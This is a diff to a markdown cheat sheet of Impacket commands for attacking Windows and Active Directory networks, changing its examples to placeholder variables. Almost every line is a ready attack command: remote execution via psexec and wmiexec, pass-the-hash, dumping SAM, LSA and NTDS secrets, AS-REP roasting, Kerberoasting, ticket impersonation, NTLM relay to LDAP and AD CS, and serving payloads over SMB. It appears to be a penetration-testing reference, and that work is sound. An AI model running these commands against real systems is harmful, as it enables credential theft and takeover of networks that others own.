@@ -7,19 +7,19 @@
 ## Core Syntax
 
 ```bash
-impacket-<tool> [options] [[domain/]username[:password]@]<target>
+impacket-<tool> [options] [[domain/]username[:password]@]$IP
 ```
 
 | Auth | Pattern |
 | --- | --- |
-| Domain password | `impacket-psexec 'CORP/<user>:<pass>@10.10.10.10'` |
-| Local password | `impacket-wmiexec '<user>:<pass>@10.10.10.10'` |
-| Pass-the-hash | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
-| Kerberos ticket | `KRB5CCNAME=<user>.ccache impacket-psexec -k -no-pass 'CORP/<user>@dc01.corp.local'` |
-| AES key | `impacket-secretsdump -aesKey <aes256-key> 'CORP/<user>@dc01.corp.local'` |
+| Domain password | `impacket-psexec '$NETBIOS/<user>:<pass>@$IP'` |
+| Local password | `impacket-wmiexec '<user>:<pass>@$IP'` |
+| Pass-the-hash | `impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'` |
+| Kerberos ticket | `KRB5CCNAME=<user>.ccache impacket-psexec -k -no-pass '$NETBIOS/<user>@$DC_IP'` |
+| AES key | `impacket-secretsdump -aesKey <aes256-key> '$NETBIOS/<user>@$DC_IP'` |
 
 !!! warning "Watch out"
-    Kerberos mode needs names, not raw IPs. Put the DC/host FQDN in `/etc/hosts`, set `KRB5CCNAME` when using a ticket, and add `-dc-ip 10.10.10.10` when DNS is unreliable.
+    Kerberos mode needs names, not raw IPs. Put the DC/host FQDN in `/etc/hosts`, set `KRB5CCNAME` when using a ticket, and add `-dc-ip $DC_IP` when DNS is unreliable.
 
 ---
 ## SMB / File Ops
@@ -27,7 +27,7 @@ impacket-<tool> [options] [[domain/]username[:password]@]<target>
 ### Enumerate shares
 
 ```bash
-impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'
+impacket-smbclient '$NETBIOS/<user>:<pass>@$IP'
 ```
 
 ```text
@@ -42,7 +42,7 @@ impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'
 
 ```bash
 printf 'shares\nuse C$\nget Users\\Public\\loot.txt loot.txt\nexit\n' > smb.cmds
-impacket-smbclient -inputfile smb.cmds 'CORP/<user>:<pass>@10.10.10.10'
+impacket-smbclient -inputfile smb.cmds '$NETBIOS/<user>:<pass>@$IP'
 ```
 
 ### Host files
@@ -50,7 +50,7 @@ impacket-smbclient -inputfile smb.cmds 'CORP/<user>:<pass>@10.10.10.10'
 ```bash
 impacket-smbserver PWN /home/user/payloads -smb2support
 
-# Target: copy \\10.10.14.2\PWN\payload.exe C:\Temp\payload.exe
+# Target: copy \\$LHOST\PWN\payload.exe C:\Temp\payload.exe
 ```
 
 ---
@@ -67,26 +67,26 @@ impacket-smbserver PWN /home/user/payloads -smb2support
 ### PSExec
 
 ```bash
-impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'
-impacket-psexec -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'
-impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
+impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP'
+impacket-psexec -hashes :<ntlm-hash> '$NETBIOS/Administrator@$IP'
+impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP' 'whoami'
 ```
 
 ### WMIExec
 
 ```bash
-impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'
-impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'
-impacket-wmiexec -shell-type powershell 'CORP/<user>:<pass>@10.10.10.10'
-impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'ipconfig /all'
+impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP'
+impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'
+impacket-wmiexec -shell-type powershell '$NETBIOS/<user>:<pass>@$IP'
+impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP' 'ipconfig /all'
 ```
 
 ### Alternate exec methods
 
 ```bash
-impacket-smbexec 'CORP/Administrator:Passw0rd@10.10.10.10'
-impacket-atexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
-impacket-dcomexec 'CORP/Administrator:Passw0rd@10.10.10.10'
+impacket-smbexec '$NETBIOS/Administrator:Passw0rd@$IP'
+impacket-atexec '$NETBIOS/Administrator:Passw0rd@$IP' 'whoami'
+impacket-dcomexec '$NETBIOS/Administrator:Passw0rd@$IP'
 ```
 
 ---
@@ -96,16 +96,16 @@ impacket-dcomexec 'CORP/Administrator:Passw0rd@10.10.10.10'
 
 ```bash
 # Remote SAM/LSA/NTDS where permitted
-impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'
+impacket-secretsdump '$NETBIOS/Administrator:Passw0rd@$IP'
 
 # Pass-the-hash
-impacket-secretsdump -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'
+impacket-secretsdump -hashes :<ntlm-hash> '$NETBIOS/Administrator@$IP'
 
 # DC-only DRSUAPI dump
-impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc01.corp.local'
+impacket-secretsdump -just-dc '$NETBIOS/Administrator:Passw0rd@$DC_IP'
 
 # Domain NTLM hashes only
-impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc01.corp.local'
+impacket-secretsdump -just-dc-ntlm '$NETBIOS/Administrator:Passw0rd@$DC_IP'
 
 # Offline SAM/SYSTEM/SECURITY
 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
@@ -117,10 +117,10 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ### Lightweight enumeration
 
 ```bash
-impacket-samrdump 'CORP/<user>:<pass>@dc01.corp.local'
-impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local'
-impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local' 4000
-impacket-netview -target 10.10.10.10 'CORP/<user>:<pass>'
+impacket-samrdump '$NETBIOS/<user>:<pass>@$DC_IP'
+impacket-lookupsid '$NETBIOS/<user>:<pass>@$DC_IP'
+impacket-lookupsid '$NETBIOS/<user>:<pass>@$DC_IP' 4000
+impacket-netview -target $IP '$NETBIOS/<user>:<pass>'
 ```
 
 ---
@@ -130,27 +130,27 @@ impacket-netview -target 10.10.10.10 'CORP/<user>:<pass>'
 
 ```bash
 # No credentials, with a user list
-impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash
+impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep.hash
 
 # Valid domain credentials
-impacket-GetNPUsers example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.hash
+impacket-GetNPUsers $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -format hashcat -outputfile asrep.hash
 ```
 
 ### Kerberoasting
 
 ```bash
-impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash
-impacket-GetUserSPNs -k -no-pass example.com/<user> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
+impacket-GetUserSPNs $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -outputfile tgs.hash
+impacket-GetUserSPNs -k -no-pass $DOMAIN/<user> -dc-ip $DC_IP -request -outputfile tgs.hash
 ```
 
 ### Ticket ops
 
 ```bash
-impacket-getTGT example.com/<user>:'<pass>' -dc-ip 10.10.10.10
-impacket-getTGT -hashes :<ntlm-hash> example.com/<user> -dc-ip 10.10.10.10
-impacket-getTGT -aesKey <aes256-key> example.com/<user> -dc-ip 10.10.10.10
+impacket-getTGT $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
+impacket-getTGT -hashes :<ntlm-hash> $DOMAIN/<user> -dc-ip $DC_IP
+impacket-getTGT -aesKey <aes256-key> $DOMAIN/<user> -dc-ip $DC_IP
 
-impacket-getST -spn cifs/dc01.example.com -impersonate Administrator example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+impacket-getST -spn cifs/$DC_IP -impersonate Administrator $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
 impacket-ticketConverter ticket.kirbi ticket.ccache
 ```
 
@@ -162,7 +162,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 ### Relay captured auth
 
 ```bash
-impacket-ntlmrelayx -t smb://10.10.10.100 -smb2support
+impacket-ntlmrelayx -t smb://$IP -smb2support
 impacket-ntlmrelayx -tf targets.txt -smb2support -i
 impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
 ```
@@ -170,9 +170,9 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
 ### LDAP relay primitives
 
 ```bash
-impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --dump-laps
-impacket-ntlmrelayx -t ldaps://dc01.example.com -smb2support --delegate-access
-impacket-ntlmrelayx -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --dump-laps
+impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access
+impacket-ntlmrelayx -t http://ca.$DOMAIN/certsrv/certfnsh.asp -smb2support --adcs --template Machine
 ```
 
 !!! warning "Watch out"
@@ -183,13 +183,13 @@ impacket-ntlmrelayx -t http://ca.example.com/certsrv/certfnsh.asp -smb2support -
 
 ```bash
 # SQL auth
-impacket-mssqlclient 'sa:Passw0rd@10.10.10.10'
+impacket-mssqlclient 'sa:Passw0rd@$IP'
 
 # Windows auth
-impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'
+impacket-mssqlclient -windows-auth '$NETBIOS/<user>:<pass>@$IP'
 
 # Non-standard port
-impacket-mssqlclient -port 14330 'sa:Passw0rd@10.10.10.10'
+impacket-mssqlclient -port 14330 'sa:Passw0rd@$IP'
 ```
 
 ```sql
@@ -225,18 +225,18 @@ impacket-mssqlclient     MSSQL shell
 
 | Task | Command |
 | --- | --- |
-| SMB shell | `impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'` |
+| SMB shell | `impacket-smbclient '$NETBIOS/<user>:<pass>@$IP'` |
 | Host payloads | `impacket-smbserver PWN /home/user/payloads -smb2support` |
-| PSExec shell | `impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'` |
-| WMIExec shell | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'` |
-| WMIExec command | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'whoami'` |
-| Pass-the-hash shell | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
-| Dump secrets | `impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'` |
+| PSExec shell | `impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP'` |
+| WMIExec shell | `impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP'` |
+| WMIExec command | `impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP' 'whoami'` |
+| Pass-the-hash shell | `impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'` |
+| Dump secrets | `impacket-secretsdump '$NETBIOS/Administrator:Passw0rd@$IP'` |
 | Offline SAM dump | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
-| AS-REP roast | `impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash` |
-| Kerberoast | `impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash` |
+| AS-REP roast | `impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep.hash` |
+| Kerberoast | `impacket-GetUserSPNs $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -outputfile tgs.hash` |
 | NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support -i` |
-| MSSQL shell | `impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'` |
+| MSSQL shell | `impacket-mssqlclient -windows-auth '$NETBIOS/<user>:<pass>@$IP'` |
 
 ---
 ## Operator Workflow
